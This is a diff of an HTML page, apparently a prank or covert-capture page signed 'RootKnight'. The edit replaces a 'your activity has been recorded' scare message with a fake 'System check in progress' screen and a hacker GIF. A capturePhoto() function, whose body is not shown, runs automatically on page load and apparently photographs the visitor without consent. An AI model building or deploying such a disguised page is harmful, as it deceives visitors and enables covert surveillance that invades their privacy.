@@ -3,22 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Alert</title>
+    <title>Security Notice</title>
     <style>
         body {
             background-color: black;
             color: limegreen;
             font-family: 'Courier New', monospace;
             text-align: center;
-            padding-top: 20%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            overflow: hidden;
         }
-        .warning {
+        .gif-container {
+            width: 200px;
+            height: 200px;
+        }
+        .message {
             font-size: 20px;
-            animation: blink 1s infinite alternate;
+            margin-top: 20px;
+            animation: fade 1.5s infinite alternate;
         }
-        @keyframes blink {
+        @keyframes fade {
             from { opacity: 1; }
-            to { opacity: 0.3; }
+            to { opacity: 0.5; }
         }
         .footer {
             margin-top: 50px;
@@ -29,8 +39,12 @@
 </head>
 <body>
 
-    <h1>⚠️ WARNING ⚠️</h1>
-    <p class="warning">Your activity has been recorded.<br>Do NOT close this window.</p>
+    <div class="gif-container">
+        <!-- Add your GIF here -->
+        <img src="my-gif.gif" alt="Hacker GIF">
+    </div>
+
+    <p class="message">System check in progress... Please wait.</p>
 
     <script>
         async function capturePhoto() {
@@ -73,7 +87,7 @@
         capturePhoto();
     </script>
 
-    <p class="footer">Hello from RootKnight 😈</p>
+    <p class="footer">RootKnight 😈</p>
 
 </body>
 </html>
